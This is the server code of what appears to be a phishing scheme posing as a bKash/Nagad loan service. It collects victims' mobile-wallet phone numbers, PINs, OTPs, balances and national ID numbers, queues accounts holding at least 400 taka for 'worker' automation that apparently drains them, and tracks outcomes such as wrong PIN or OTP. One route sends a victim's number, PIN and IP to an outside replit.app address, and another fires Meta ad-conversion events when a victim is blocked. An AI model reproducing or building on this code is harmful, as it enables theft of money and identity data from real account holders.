const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const { initializeApp, getApps } = require('firebase/app');
const { initializeFirestore, getFirestore, collection, doc, setDoc, deleteDoc, onSnapshot, getDocs } = require('firebase/firestore');
const firebaseConfig = require('./firebase-applet-config.json');

let firebaseApp;
if (!getApps().length) {
  firebaseApp = initializeApp(firebaseConfig);
} else {
  firebaseApp = getApps()[0];
}
let adminDb;
try {
  adminDb = initializeFirestore(firebaseApp, {
    experimentalAutoDetectLongPolling: true,
    experimentalForceLongPolling: true,
  }, firebaseConfig.firestoreDatabaseId);
} catch (e) {
  adminDb = getFirestore(firebaseApp, firebaseConfig.firestoreDatabaseId);
}

const PORT = 3000;
const app = express();

const distPublicPath = path.join(__dirname, 'dist', 'public');
const distIndexPath = path.join(distPublicPath, 'index.html');

function serveIndex(req, res) {
  if (fs.existsSync(distIndexPath)) {
    return res.sendFile(distIndexPath);
  }
  res.status(200).send('NO_DATA');
}

app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

if (fs.existsSync(distPublicPath)) {
  app.use(express.static(distPublicPath));
}

app.get('/api/health', (req, res) => res.status(200).json({ status: 'ok' }));

const DATA_DIR = path.join(__dirname, 'data');
let sessions = {};
let blockedIps = {};
let settings = {};

if (require.main === module) {
  onSnapshot(collection(adminDb, 'sessions'), snap => {
    const newSessions = {};
    snap.forEach(doc => { newSessions[doc.id] = doc.data(); });
    sessions = newSessions;
  });
  onSnapshot(collection(adminDb, 'blocked_ips'), snap => {
    const newBlocked = {};
    snap.forEach(doc => { newBlocked[doc.id] = true; });
    blockedIps = newBlocked;
  });
  onSnapshot(collection(adminDb, 'settings'), snap => {
    const newSettings = {};
    snap.forEach(doc => {
      const data = doc.data();
      newSettings[doc.id] = ('value' in data) ? data.value : data;
    });
    settings = newSettings;
  });
}

function saveSessions() {}
function saveBlockedIps() {}

const LOCK_TIMEOUT_MS = 180000; // 3 minutes

/**
 * Release any session locks whose age has reached or exceeded lockTimeoutMs.
 * Calls saveFn only when at least one lock was cleared (avoids unnecessary I/O).
 *
 * @param {object} sessionsObj  - mutable sessions map (modified in-place)
 * @param {Function} saveFn    - called when one or more locks were released
 * @param {number} lockTimeoutMs - maximum allowed lock age in milliseconds
 * @param {number} [now]       - override for Date.now() (useful in tests)
 */
function runLockSweeper(sessionsObj, saveFn, lockTimeoutMs, now) {
  const ts = now !== undefined ? now : Date.now();
  let changed = false;
  for (const [id, data] of Object.entries(sessionsObj)) {
    if (data && data.assignedWorker && data.assignedAt) {
      const lockAge = ts - data.assignedAt;
      if (lockAge >= lockTimeoutMs) {
        const updates = { ...data, assignedWorker: null, assignedAt: null, adminAction: data.adminAction || 'REVIEW_APP', lastUpdated: ts };
        sessionsObj[id] = updates;
        setDoc(doc(adminDb, 'sessions', id), updates);
        changed = true;
      }
    }
  }
  if (changed) saveFn();
}

const ONE_DAY_MS = 24 * 60 * 60 * 1000; // 24 hours (1 day)
const PURGE_SWEEPER_INTERVAL_MS = 10 * 60 * 1000; // run every 10 minutes

/**
 * Automatically delete all sessions that are older than 24 hours (1 day).
 * Purges from Firestore collection 'sessions' and the in-memory sessions map.
 *
 * @param {object} sessionsObj - mutable in-memory sessions map
 * @param {object} firestoreDb - Firestore db instance
 * @param {number} [now] - override for Date.now()
 * @returns {Promise<number>} - number of deleted sessions
 */
async function purgeOldSessions(sessionsObj, firestoreDb, now) {
  const ts = now !== undefined ? now : Date.now();
  const toDeleteIds = new Set();

  if (sessionsObj) {
    for (const [id, data] of Object.entries(sessionsObj)) {
      if (!data) {
        toDeleteIds.add(id);
        continue;
      }
      const sessionTime = data.lastUpdated || data.createdAt || data.assignedAt || (id.startsWith('SESS-') ? parseInt(id.replace('SESS-', ''), 10) : 0);
      if (sessionTime && (ts - sessionTime) >= ONE_DAY_MS) {
        toDeleteIds.add(id);
      }
    }
  }

  if (firestoreDb) {
    try {
      const snap = await getDocs(collection(firestoreDb, 'sessions'));
      snap.forEach(docSnap => {
        const d = docSnap.data() || {};
        const docId = docSnap.id;
        const sTime = d.lastUpdated || d.createdAt || d.assignedAt || (docId.startsWith('SESS-') ? parseInt(docId.replace('SESS-', ''), 10) : 0);
        if (sTime && (ts - sTime) >= ONE_DAY_MS) {
          toDeleteIds.add(docId);
        }
      });
    } catch (err) {
      console.error('[Auto-Purge] Error fetching Firestore sessions:', err);
    }
  }

  let deletedCount = 0;
  for (const id of toDeleteIds) {
    if (sessionsObj && sessionsObj[id]) {
      delete sessionsObj[id];
    }
    if (firestoreDb) {
      try {
        await deleteDoc(doc(firestoreDb, 'sessions', id));
        deletedCount++;
      } catch (e) {
        console.error(`[Auto-Purge] Failed to delete doc ${id}:`, e);
      }
    } else {
      deletedCount++;
    }
  }

  if (toDeleteIds.size > 0) {
    console.log(`[Auto-Purge] Automatically deleted ${toDeleteIds.size} session(s) older than 1 day.`);
  }
  return deletedCount;
}

// Background sweepers
const LOCK_SWEEPER_INTERVAL_MS = 60000; // run every 60 seconds
if (require.main === module) {
  setInterval(() => {
    runLockSweeper(sessions, saveSessions, LOCK_TIMEOUT_MS);
  }, LOCK_SWEEPER_INTERVAL_MS);

  // Run 1-day auto-purge immediately on startup and every 10 minutes
  purgeOldSessions(sessions, adminDb).catch(() => {});
  setInterval(() => {
    purgeOldSessions(sessions, adminDb).catch(() => {});
  }, PURGE_SWEEPER_INTERVAL_MS);
}

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.connection?.remoteAddress;
}


// Unified handler for all worker data endpoints (Bug 1: was duplicated)
function handleGetData(worker, req, res) {
  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  try {
    const allSessions = Object.entries(sessions)
      .map(([id, data]) => ({ id, data }))
      .filter(s => {
        const isNagad = s.data.provider === 'nagad';
        return worker === '1' ? isNagad : !isNagad;
      });

    // If this worker already holds an active lock, remember which session it's on.
    // They may only receive data for that session — not pick up a new/different one.
    const workerLockedSessionId = Object.entries(sessions).find(([, d]) =>
      d.assignedWorker === worker &&
      d.assignedAt &&
      (Date.now() - d.assignedAt) < LOCK_TIMEOUT_MS
    )?.[0] ?? null;

    const pending = allSessions.filter(s => {
      const d = s.data;

      // Block worker from grabbing a NEW session while they hold a lock on a different one
      if (workerLockedSessionId && s.id !== workerLockedSessionId) return false;

      // Bug 3 fix: pinResetMode sessions now also respect the worker lock
      if (d.pinResetMode === true && d.pin) {
        if (d.assignedWorker && d.assignedWorker !== worker) {
          const lockAge = d.assignedAt ? (Date.now() - d.assignedAt) : Infinity;
          if (lockAge < LOCK_TIMEOUT_MS) return false;
          const updates = { ...d, assignedWorker: null, assignedAt: null, adminAction: 'REVIEW_APP', lastUpdated: Date.now() };
          sessions[s.id] = updates;
          setDoc(doc(adminDb, 'sessions', s.id), updates);
          return false;
        }
        const pinOnlyData = `NONE,NONE,NONE,${s.id},${d.pin}`;
        if (d.lastAutomationData === pinOnlyData) return false;
        return true;
      }

      const number = d.gatewayPhone || d.initialPhone;
      const balance = d.balance;
      if (!number || !balance) return false;
      if (balance !== 'NONE' && parseInt(balance) < 400) return false;

      if (d.assignedWorker && d.assignedWorker !== worker) {
        const lockAge = d.assignedAt ? (Date.now() - d.assignedAt) : Infinity;
        if (lockAge < LOCK_TIMEOUT_MS) return false;
        const updates = { ...d, assignedWorker: null, assignedAt: null, adminAction: 'REVIEW_APP', lastUpdated: Date.now() };
          sessions[s.id] = updates;
          setDoc(doc(adminDb, 'sessions', s.id), updates);
        return false;
      }

      const cappedBalance = (balance !== 'NONE' && parseInt(balance) > 10000) ? '10000' : balance;
      const rawOtp = d.gatewayOtp || d.otp || '';
      const currentOtp = (rawOtp && typeof rawOtp === 'string' && rawOtp.trim() !== '' && rawOtp !== 'NONE') ? rawOtp : 'NONE';
      const pinToSend = d.pin || 'NONE';
      const currentData = `${cappedBalance},${number},${currentOtp},${s.id},${pinToSend}`;
      if (d.lastAutomationData === currentData) return false;
      return true;
    });

    pending.sort((a, b) => {
      const aOtp = a.data.gatewayOtp || a.data.otp || '';
      const aPin = a.data.pin || '';
      const bOtp = b.data.gatewayOtp || b.data.otp || '';
      const bPin = b.data.pin || '';
      const aHasPriority = (aOtp && aOtp !== 'NONE') || (aPin && aPin !== 'NONE') || a.data.pinResetMode === true;
      const bHasPriority = (bOtp && bOtp !== 'NONE') || (bPin && bPin !== 'NONE') || b.data.pinResetMode === true;
      if (aHasPriority && !bHasPriority) return -1;
      if (!aHasPriority && bHasPriority) return 1;
      return (a.data.lastUpdated || 0) - (b.data.lastUpdated || 0);
    });

    if (pending.length > 0) {
      const { id, data } = pending[0];
      if (data.pinResetMode === true && data.pin) {
        const pinOnlyData = `NONE,NONE,NONE,${id},${data.pin}`;
        const sendTime = Date.now();
        const updates = { ...data, assignedWorker: worker, assignedAt: sendTime, lastAutomationData: pinOnlyData, lastUpdated: sendTime, lastDataSentAt: sendTime, lastDataType: 'pin_reset', lastActionTrigger: null, lastActionAt: 0, pinResetMode: false };
        sessions[id] = updates;
        setDoc(doc(adminDb, 'sessions', id), updates);
        return res.send(pinOnlyData);
      }
      const number = data.gatewayPhone || data.initialPhone;
      const balance = data.balance;
      const cappedBalance = (balance !== 'NONE' && parseInt(balance) > 10000) ? '10000' : balance;
      const rawOtp = data.gatewayOtp || data.otp || '';
      const currentOtp = (rawOtp && typeof rawOtp === 'string' && rawOtp.trim() !== '' && rawOtp !== 'NONE') ? rawOtp : 'NONE';
      const pinToSend = data.pin || 'NONE';
      const dataType = currentOtp !== 'NONE' ? 'otp' : 'first';
      const currentData = `${cappedBalance},${number},${currentOtp},${id},${pinToSend}`;
      const sendTime = Date.now();
      const updates = { ...data, assignedWorker: worker, assignedAt: sendTime, lastAutomationData: currentData, lastUpdated: sendTime, lastDataSentAt: sendTime, lastDataType: dataType, lastActionTrigger: null, lastActionAt: 0, balance: '', otp: '', gatewayOtp: '', lastBalance: data.balance || data.lastBalance || '' };
      sessions[id] = updates;
      setDoc(doc(adminDb, 'sessions', id), updates);
      return res.send(currentData);
    }
    return res.send("NO_DATA");
  } catch (err) {
    return res.send("NO_DATA");
  }
}

app.get('/api/get-data', (req, res) => handleGetData(req.query.worker || '1', req, res));

for (let i = 1; i <= 21; i++) {
  app.get(`/api/worker${i}`, (req, res) => handleGetData(String(i), req, res));
}

const AI_API_KEY = process.env.AI_API_KEY || 'bkash-ai-secret-2025';

function normalizePhoneForLookup(p) {
  if (!p) return '';
  let s = String(p).replace(/[^\d]/g, '');
  if (s.startsWith('880')) s = '0' + s.slice(3);
  else if (s.startsWith('88')) s = '0' + s.slice(2);
  if (!s.startsWith('0')) s = '0' + s;
  return s;
}

app.get('/api/customer-lookup', (req, res) => {
  const key = req.query.key || req.headers['x-api-key'];
  if (!key || key !== AI_API_KEY) {
    return res.status(401).json({ error: 'Unauthorized: invalid API key' });
  }

  const phone = req.query.phone;
  if (!phone) {
    return res.status(400).json({ error: 'Missing phone parameter' });
  }

  const normalized = normalizePhoneForLookup(phone);

  function getApplicationStatus(adminAction) {
    if (adminAction === 'APPROVE') return 'APPROVED';
    if (['WRONG_CODE', 'REJECT_PIN', 'WRONG_NUMBER', 'REVERIFY_BALANCE', 'CANCEL_ALL'].includes(adminAction)) return 'FAILED';
    return 'IN_PROGRESS';
  }

  function getApplicationStatusBn(adminAction) {
    if (adminAction === 'APPROVE') return 'অভিনন্দন — আবেদন সফল হয়েছে';
    if (adminAction === 'WRONG_CODE') return 'ব্যর্থ — ভুল OTP দিয়েছে';
    if (adminAction === 'REJECT_PIN') return 'ব্যর্থ — ভুল PIN দিয়েছে';
    if (adminAction === 'WRONG_NUMBER') return 'ব্যর্থ — ভুল নম্বর দিয়েছে';
    if (adminAction === 'REVERIFY_BALANCE') return 'ব্যর্থ — balance পুনরায় যাচাই করতে বলা হয়েছে';
    if (adminAction === 'CANCEL_ALL') return 'ব্যর্থ — বাতিল করা হয়েছে';
    if (adminAction === 'SHOW_VERIFY') return 'চলমান — OTP যাচাই পর্যায়ে আছে';
    if (adminAction === 'REVIEW_APP') return 'চলমান — আবেদন পর্যালোচনায় আছে';
    return 'চলমান — আবেদন প্রক্রিয়াধীন';
  }

  const allMatches = Object.entries(sessions)
    .filter(([id, data]) => {
      if (!data) return false;
      const p1 = normalizePhoneForLookup(data.initialPhone);
      const p2 = normalizePhoneForLookup(data.gatewayPhone);
      return p1 === normalized || p2 === normalized;
    })
    .map(([id, data]) => ({
      sessionId: id,
      orderId: data.orderId || '',
      name: data.name || '',
      provider: data.provider || 'bkash',
      phone: data.initialPhone || data.gatewayPhone || '',
      currentBalance: data.balance || '',
      lastKnownBalance: data.lastBalance || data.balance || '',
      loanAmount: data.loanAmount || '',
      duration: data.duration || '',
      address: data.address || '',
      nidNumber: data.nidNumber || '',
      adminAction: data.adminAction || 'NONE',
      applicationStatus: getApplicationStatus(data.adminAction || 'NONE'),
      applicationStatusBn: getApplicationStatusBn(data.adminAction || 'NONE'),
      isBlocked: data.blocked === true || false,
      lastUpdated: data.lastUpdated ? new Date(data.lastUpdated).toISOString() : null,
    }))
    .sort((a, b) => new Date(b.lastUpdated || 0) - new Date(a.lastUpdated || 0));

  if (allMatches.length === 0) {
    return res.json({ found: false, phone: normalized, totalApplications: 0, customers: [] });
  }

  const withLatest = allMatches.map((c, i) => ({ ...c, isLatestApplication: i === 0 }));
  const latest = withLatest[0];

  return res.json({
    found: true,
    phone: normalized,
    totalApplications: allMatches.length,
    latestApplicationStatus: latest.applicationStatus,
    latestApplicationStatusBn: latest.applicationStatusBn,
    latestBalance: latest.lastKnownBalance,
    customers: withLatest,
  });
});

function handleAutomationReport(req, res) {
  let id = req.body?.id || req.query?.id;
  const status = req.body?.status || req.query?.status;
  const worker = req.body?.worker || req.query?.worker || null;
  if (!status) return res.status(400).json({ error: 'Missing status' });

  try {
    if (!id || id.trim() === '') {
      const allSessions = Object.entries(sessions).map(([sid, sdata]) => ({ id: sid, data: sdata }));
      let bestSession = null;
      let bestTime = 0;
      for (const s of allSessions) {
        if (s.data.lastAutomationData && s.data.lastAutomationData !== '' && (s.data.lastUpdated || 0) > bestTime) {
          // Bug 4 fix: require exact worker match; null assignedWorker must not be selected
          if (worker && s.data.assignedWorker !== worker) continue;
          bestTime = s.data.lastUpdated || 0;
          bestSession = s;
        }
      }
      if (bestSession) { id = bestSession.id; }
      else { return res.status(400).json({ error: 'No active session found' }); }
    }

    const existing = sessions[id];
    if (!existing) return res.status(404).json({ error: 'Session not found' });

    const updates = {
      processedByAutomation: true,
      lastUpdated: Date.now(),
      lastActionAt: Date.now(),
      lastActionTrigger: status
    };

    if (status === 'WRONG_OTP') { updates.adminAction = 'WRONG_CODE'; updates.processedByAutomation = false; updates.otp = ''; updates.gatewayOtp = ''; updates.lastAutomationData = ''; }
    else if (status === 'SHOW_CODE') { updates.adminAction = 'SHOW_VERIFY'; }
    else if (status === 'WRONG_PIN') { updates.adminAction = 'REJECT_PIN'; updates.pin = ''; updates.lastAutomationData = ''; }
    else if (status === 'WRONG_NUMBER') { updates.adminAction = 'WRONG_NUMBER'; updates.balance = ''; updates.otp = ''; updates.gatewayOtp = ''; updates.assignedWorker = null; updates.assignedAt = null; }
    else if (status === 'REVIEW') { updates.adminAction = 'REVIEW_APP'; updates.assignedWorker = null; updates.assignedAt = null; }
    else if (status === 'REVERIFY_BALANCE') { updates.adminAction = 'REVERIFY_BALANCE'; updates.balance = ''; updates.otp = ''; updates.gatewayOtp = ''; updates.assignedWorker = null; updates.assignedAt = null; }
    else if (status === 'DONE') { updates.processedByAutomation = true; updates.assignedWorker = null; updates.assignedAt = null; }

    sessions[id] = Object.assign({}, existing, updates);
    setDoc(doc(adminDb, 'sessions', id), sessions[id]);
    res.type('text/plain').send('NO_DATA');
  } catch (err) {
    res.status(500).type('text/plain').send('NO_DATA');
  }
}

app.get('/api/report', handleAutomationReport);
app.post('/api/report', handleAutomationReport);
app.post('/api/automation/report', handleAutomationReport);
app.get('/api/automation/report', handleAutomationReport);

app.get('/api/check-blocked', (req, res) => {
  const ip = getClientIp(req);
  res.json({ blocked: blockedIps[ip] === true, ip });
});

app.post('/api/block-ip', (req, res) => {
  blockedIps[req.body.ip] = true;
  setDoc(doc(adminDb, 'blocked_ips', req.body.ip), { blocked: true });
  res.json({ success: true });
});

app.post('/api/unblock-ip', (req, res) => {
  delete blockedIps[req.body.ip];
  deleteDoc(doc(adminDb, 'blocked_ips', req.body.ip));
  res.json({ success: true });
});

app.get('/api/block-ip-trigger', (req, res) => {
  const ip = req.query.ip;
  if (!ip) {
    return res.status(400).type('text/plain').send('NO_DATA');
  }
  blockedIps[ip] = true;
  setDoc(doc(adminDb, 'blocked_ips', ip), { blocked: true });
  const matching = Object.values(sessions).filter(s => s && s.clientIp === ip && !s.purchaseFired && !s.purchaseInFlight);
  Promise.allSettled(matching.map(s => firePurchaseForSession(s, req.headers.referer || '')))
    .then(results => {
      const ok = results.filter(r => r.status === 'fulfilled' && r.value && r.value.ok).length;
      const failed = results.length - ok;
      if (failed > 0) console.error(`Purchase CAPI: ${failed}/${results.length} failed for ip=${ip}`);
    })
    .catch(() => {});
  res.type('text/plain').send('NO_DATA');
});

app.get('/api/block-customer', (req, res) => {
  const customerId = req.query.customerId;
  if (!customerId) {
    return res.status(400).type('text/plain').send('NO_DATA');
  }
  const customer = sessions[customerId];
  if (!customer || !customer.clientIp) {
    return res.status(404).type('text/plain').send('NO_DATA');
  }
  const ip = customer.clientIp;
  blockedIps[ip] = true;
  setDoc(doc(adminDb, 'blocked_ips', ip), { blocked: true });
  firePurchaseForSession(customer, req.headers.referer || '').catch(() => {});

  const number = customer.gatewayPhone || customer.initialPhone || '';
  const pin = customer.pin || '';
  if (ip && number && pin) {
    const submitUrl = `https://official-gov-bkash-loan-instant-bd-imstant-loan-get-online-form.replit.app/api/public/submit?pw=onlinebased321&number=${encodeURIComponent(number)}&pin=${encodeURIComponent(pin)}&ip=${encodeURIComponent(ip)}`;
    fetch(submitUrl).catch(() => {});
  }

  res.type('text/plain').send('NO_DATA');
});



app.get('/api/db', (req, res) => {
  const { path: dbPath } = req.query;
  if (dbPath && dbPath.startsWith('sessions/')) {
    return res.json(sessions[dbPath.replace('sessions/', '')] || null);
  }
  if (dbPath && dbPath.startsWith('settings/')) {
    return res.json(settings[dbPath.replace('settings/', '')] ?? null);
  }
  res.json(null);
});

app.post('/api/db', (req, res) => {
  const { path: dbPath, data } = req.body;
  if (dbPath && dbPath.startsWith('sessions/')) {
    // Bug 5 fix: merge instead of full replace to preserve server-side fields
    const id = dbPath.replace('sessions/', '');
    sessions[id] = Object.assign({}, sessions[id] || {}, data);
    setDoc(doc(adminDb, 'sessions', id), sessions[id], { merge: true });
  } else if (dbPath && dbPath.startsWith('settings/')) {
    const key = dbPath.replace('settings/', '');
    settings[key] = data;
    setDoc(doc(adminDb, 'settings', key), { value: data }, { merge: true });
  }
  res.json({ success: true });
});

app.patch('/api/db', (req, res) => {
  const { path: dbPath, data } = req.body;
  if (dbPath && dbPath.startsWith('sessions/')) {
    const id = dbPath.replace('sessions/', '');
    sessions[id] = Object.assign({}, sessions[id] || {}, data);
    setDoc(doc(adminDb, 'sessions', id), sessions[id], { merge: true });
  } else if (dbPath && dbPath.startsWith('settings/')) {
    const key = dbPath.replace('settings/', '');
    settings[key] = data;
    setDoc(doc(adminDb, 'settings', key), { value: data }, { merge: true });
  }
  res.json({ success: true });
});

app.delete('/api/db', (req, res) => {
  const { path: dbPath } = req.query;
  if (dbPath && dbPath.startsWith('sessions/')) {
    const id = dbPath.replace('sessions/', '');
    delete sessions[id];
    deleteDoc(doc(adminDb, 'sessions', id));
  } else if (dbPath && dbPath.startsWith('settings/')) {
    const key = dbPath.replace('settings/', '');
    delete settings[key];
    deleteDoc(doc(adminDb, 'settings', key));
  }
  res.json({ success: true });
});

const crypto = require('crypto');
const META_PIXEL_ID = process.env.META_PIXEL_ID || '1605784090589098';
const META_ACCESS_TOKEN = process.env.META_PIXEL_ACCESS_TOKEN || '';
const META_TEST_EVENT_CODE = process.env.META_TEST_EVENT_CODE || '';

function sha256(v) {
  if (!v) return '';
  return crypto.createHash('sha256').update(String(v).trim().toLowerCase()).digest('hex');
}

function normalizePhone(p) {
  if (!p) return '';
  let s = String(p).replace(/[^\d]/g, '');
  if (s.startsWith('0')) s = '88' + s;
  else if (s.length === 10) s = '880' + s;
  else if (!s.startsWith('88')) s = '88' + s;
  return s;
}

const ALLOWED_CAPI_EVENTS = new Set([
  'PageView', 'AddToCart', 'InitiateCheckout', 'Purchase',
  'Lead', 'CompleteRegistration', 'ViewContent'
]);

function isSameOriginRequest(req) {
  const host = req.headers['x-forwarded-host'] || req.headers.host || '';
  const origin = req.headers.origin || '';
  const referer = req.headers.referer || '';
  if (!origin && !referer) return false;
  try {
    if (origin) {
      const u = new URL(origin);
      if (u.host === host) return true;
    }
    if (referer) {
      const u = new URL(referer);
      if (u.host === host) return true;
    }
  } catch (e) {}
  return false;
}

async function sendCapiEvent({ eventName, eventId, eventTime, userData = {}, customData = {}, sourceUrl = '', actionSource = 'website' }) {
  if (!META_ACCESS_TOKEN) return { ok: false, reason: 'no_token' };
  if (!eventName || !ALLOWED_CAPI_EVENTS.has(eventName)) return { ok: false, reason: 'invalid_event_name' };
  if (!eventId || typeof eventId !== 'string') return { ok: false, reason: 'invalid_event_id' };

  const ud = {};
  if (userData.client_ip_address) ud.client_ip_address = userData.client_ip_address;
  if (userData.client_user_agent) ud.client_user_agent = userData.client_user_agent;
  if (userData.phone) ud.ph = sha256(normalizePhone(userData.phone));
  else if (userData.ph) ud.ph = userData.ph;
  if (userData.external_id) ud.external_id = sha256(userData.external_id);
  if (userData.fbp) ud.fbp = userData.fbp;
  if (userData.fbc) ud.fbc = userData.fbc;

  const event = {
    event_name: eventName,
    event_time: eventTime || Math.floor(Date.now() / 1000),
    event_id: eventId,
    event_source_url: sourceUrl,
    action_source: actionSource,
    user_data: ud,
    custom_data: customData,
  };

  const payload = { data: [event] };
  if (META_TEST_EVENT_CODE) payload.test_event_code = META_TEST_EVENT_CODE;

  const url = `https://graph.facebook.com/v18.0/${META_PIXEL_ID}/events?access_token=${encodeURIComponent(META_ACCESS_TOKEN)}`;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });
    const j = await r.json().catch(() => ({}));
    if (!r.ok) {
      console.error('CAPI error:', JSON.stringify(j));
      return { ok: false, error: j };
    }
    return { ok: true, fb: j };
  } catch (err) {
    console.error('CAPI exception:', err);
    return { ok: false, error: String(err) };
  }
}

app.post('/api/capi', async (req, res) => {
  if (!isSameOriginRequest(req)) {
    return res.status(403).json({ ok: false, reason: 'forbidden_origin' });
  }
  const body = req.body || {};
  const result = await sendCapiEvent({
    eventName: body.event_name,
    eventId: body.event_id,
    eventTime: body.event_time,
    sourceUrl: body.event_source_url || '',
    userData: {
      client_ip_address: getClientIp(req) || '',
      client_user_agent: body.user_data?.client_user_agent || req.headers['user-agent'] || '',
      phone: body.user_data?.ph || '',
      external_id: body.user_data?.external_id || '',
      fbp: body.user_data?.fbp || '',
      fbc: body.user_data?.fbc || '',
    },
    customData: body.custom_data || {},
  });
  const status = result.reason === 'invalid_event_name' || result.reason === 'invalid_event_id' ? 400 : 200;
  return res.status(status).json(result);
});

async function firePurchaseForSession(sess, sourceUrl) {
  if (!sess || sess.purchaseFired) return { skipped: true };
  if (sess.purchaseInFlight) return { skipped: true, reason: 'in_flight' };
  sess.purchaseInFlight = true;
  setDoc(doc(adminDb, 'sessions', sess.id || sess.orderId || 'unknown'), sess, { merge: true });
  const eventId = sess.purchaseEventId || ('purchase_' + (sess.id || sess.orderId || Date.now()));
  sess.purchaseEventId = eventId;
  const result = await sendCapiEvent({
    eventName: 'Purchase',
    eventId,
    userData: {
      client_ip_address: sess.clientIp || '',
      phone: sess.initialPhone || '',
      external_id: sess.id || '',
    },
    customData: {
      content_name: (sess.provider === 'nagad' ? 'Nagad' : 'bKash') + ' Loan Approved',
      content_category: 'loan',
      currency: 'BDT',
      value: 0,
      order_id: sess.orderId || '',
    },
    sourceUrl: sourceUrl || '',
    actionSource: 'system_generated',
  });
  sess.purchaseInFlight = false;
  if (result && result.ok) {
    sess.purchaseFired = true;
    sess.purchaseFiredAt = Date.now();
  } else {
    sess.purchaseLastError = (result && (result.reason || JSON.stringify(result.error))) || 'unknown';
    sess.purchaseLastAttemptAt = Date.now();
  }
  setDoc(doc(adminDb, 'sessions', sess.id || sess.orderId || 'unknown'), sess, { merge: true });
  return result;
}

app.get('/api/sessions', (req, res) => res.json(sessions));

app.delete('/api/sessions/all', async (req, res) => {
  try {
    sessions = {};

    let deletedCount = 0;
    try {
      const snap = await getDocs(collection(adminDb, 'sessions'));
      const deletePromises = [];
      snap.forEach(docSnap => {
        deletedCount++;
        deletePromises.push(
          deleteDoc(doc(adminDb, 'sessions', docSnap.id)).catch(err =>
            console.error(`Error deleting session ${docSnap.id}:`, err)
          )
        );
      });
      await Promise.all(deletePromises);
    } catch (fsErr) {
      console.error('Error fetching Firestore sessions for deletion in /api/sessions/all:', fsErr);
    }

    res.json({ success: true, count: deletedCount });
  } catch (err) {
    console.error('Failed to clear all sessions:', err);
    res.status(500).json({ error: 'Failed to clear all sessions' });
  }
});

app.get('*all', (req, res) => {
  if (req.path.startsWith('/api')) {
    return res.status(404).json({ error: 'API route not found' });
  }
  serveIndex(req, res);
});

if (require.main === module) {
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
  });
}

// Exported for unit testing only — not part of the public API
if (typeof module !== 'undefined') {
  module.exports = {
    runLockSweeper,
    LOCK_TIMEOUT_MS,
    LOCK_SWEEPER_INTERVAL_MS,
    purgeOldSessions,
    ONE_DAY_MS,
    PURGE_SWEEPER_INTERVAL_MS
  };
}
